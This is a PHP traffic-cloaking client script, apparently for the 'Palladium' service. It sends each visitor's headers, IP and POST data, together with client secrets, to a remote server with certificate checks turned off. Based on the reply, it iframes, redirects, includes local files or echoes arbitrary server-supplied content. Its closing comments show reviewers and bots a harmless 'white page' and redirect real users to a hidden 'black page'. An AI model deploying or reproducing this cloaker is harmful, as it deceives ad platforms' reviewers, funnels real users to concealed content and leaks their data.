<?php

class RequestHandlerClient
{
    const SERVER_URL = 'https://rbl.palladium.expert';

    /**
     * @return bool
     */
    public function run()
    {
        $headers = [];
        $headers['request'] = $this->collectRequestData();
        $headers['jsrequest'] = $this->collectJsRequestData();
        $headers['server'] = $this->collectHeaders();
        $headers['auth']['clientId'] = __PALLADIUM_CLIENT_ID__;
        $headers['auth']['clientCompany'] = "__PALLADIUM_CLIENT_COMPANY__";
        $headers['auth']['clientSecret'] = "__PALLADIUM_CLIENT_SECRET__";
        $headers['server']['bannerSource'] = '__PALLADIUM_BANNER_SOURCE__';

        return $this->curlSend($headers);
    }

    /**
     * @param array<string, mixed> $params
     * @return bool
     */
    public function curlSend(array $params)
    {
        $answer = false;
        $curl = curl_init(self::SERVER_URL);
        if ($curl) {
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($params));

            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3);
            curl_setopt($curl, CURLOPT_TIMEOUT, 4);
            curl_setopt($curl, CURLOPT_TIMEOUT_MS, 4000);
            curl_setopt($curl, CURLOPT_FORBID_REUSE, true);

            $result = curl_exec($curl);
            if ($result) {
                $serverOut = json_decode($result, true);
                $status = curl_getinfo($curl, CURLINFO_HTTP_CODE);

                if ($status == 200 && is_array($serverOut)) {
                    $answer = $this->handleServerReply($serverOut);
                    return $answer;
                }
            }
        }

        // On curl error, show white page as safe fallback
        require_once __DIR__ . '/mainpage.php';
        exit;
    }

    protected function handleServerReply($reply)
    {
        $result = (bool) ($reply['result'] ? $reply['result'] : 0);

        if (
            isset($reply['mode']) &&
            (
                (isset($reply['target'])) ||
                (isset($reply['content']) && !empty($reply['content']))
            )
        ) {
            $target = $reply['target'] ?? '';
            $mode = $reply['mode'];
            $content = $reply['content'] ?? '';

            if (preg_match('/^https?:/i', $target) && $mode == 3) {
                $mode = 2;
            }

            if ($result && $mode == 1) {
                $this->displayIFrame($target);
                exit;
            } elseif ($result && $mode == 2) {
                header("Location: {$target}");
                exit;
            } elseif ($result && $mode == 3) {
                $target = parse_url($target);
                if (isset($target['query'])) {
                    parse_str($target['query'], $_GET);
                }
                require_once $this->sanitizePath($target['path']);
                exit;
            } elseif ($result && $mode == 4) {
                echo $content;
                exit;
            } else if (!$result && $mode == 5) {
                // Show white page
            } elseif ($mode == 6) {
                // Custom mode
            } else {
                $path = $this->sanitizePath($target);
                if (!$this->isLocal($path)) {
                    header("404 Not Found", true, 404);
                } else {
                    require_once $path;
                }
                exit;
            }
        }

        return $result;
    }

    private function displayIFrame($target) {
        $target = htmlspecialchars($target);
        echo "<html>
              <head>
              <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
              </head>
              <body>
              <iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>
              </body>
          </html>";
    }

    private function sanitizePath($path)
    {
        if (empty($path)) {
            return __DIR__ . '/mainpage.php';
        }
        if ($path[0] !== '/') {
            $path = __DIR__ . '/' . $path;
        } else {
            $path = __DIR__ . $path;
        }
        return $path;
    }

    private function isLocal($path)
    {
        $url = parse_url($path);

        if (!isset($url['scheme']) || !isset($url['host'])) {
            return true;
        } else {
            return false;
        }
    }

    /**
     * Get all HTTP server headers
     * @return mixed
     */
    protected function collectHeaders()
    {
        $userParams = [
            'REMOTE_ADDR',
            'SERVER_PROTOCOL',
            'SERVER_PORT',
            'REMOTE_PORT',
            'QUERY_STRING',
            'REQUEST_SCHEME',
            'REQUEST_URI',
            'REQUEST_TIME_FLOAT',
            'X_FB_HTTP_ENGINE',
            'X_PURPOSE',
            'X_FORWARDED_FOR',
            'X_WAP_PROFILE',
            'X-Forwarded-Host',
            'X-Forwarded-For',
            'X-Frame-Options',
        ];

        $headers = [];
        foreach ($_SERVER as $key => $value) {
            if (in_array($key, $userParams) || substr_compare('HTTP', $key, 0, 4) == 0) {
                $headers[$key] = $value;
            }
        }

        return $headers;
    }

    private function collectRequestData(): array
    {
        $data = [];
        if (!empty($_POST)) {
            if (!empty($_POST['data'])) {
                $data = json_decode($_POST['data'], true);
                if (JSON_ERROR_NONE !== json_last_error()) {
                    $data = json_decode(stripslashes($_POST['data']), true);
                }
                unset($_REQUEST['data']);
            }

            if (!empty($_POST['crossref_sessionid'])) {
                $data['cr-session-id'] = $_POST['crossref_sessionid'];
                unset($_POST['crossref_sessionid']);
            }
        }

        return $data;
    }

    public function collectJsRequestData(): array
    {
        $data = [];
        if (!empty($_POST)) {
            if (!empty($_POST['jsdata'])) {
                $data = json_decode($_POST['jsdata'], true);
                if (JSON_ERROR_NONE !== json_last_error()) {
                    $data = json_decode(stripslashes($_POST['jsdata']), true);
                }
                unset($_REQUEST['jsdata']);
            }
        }
        return $data;
    }
}

// Run Palladium check
// $isTarget = true means BOT/safe visitor -> show white page
// $isTarget = false means REAL user -> redirect to black page (newspage)
$isTarget = (new RequestHandlerClient())->run();

if ($isTarget) {
    // Show white page for bots
    require_once __DIR__ . '/mainpage.php';
    exit;
} else {
    // Redirect real users to black page
    header('Location: /newspage/');
    exit;
}
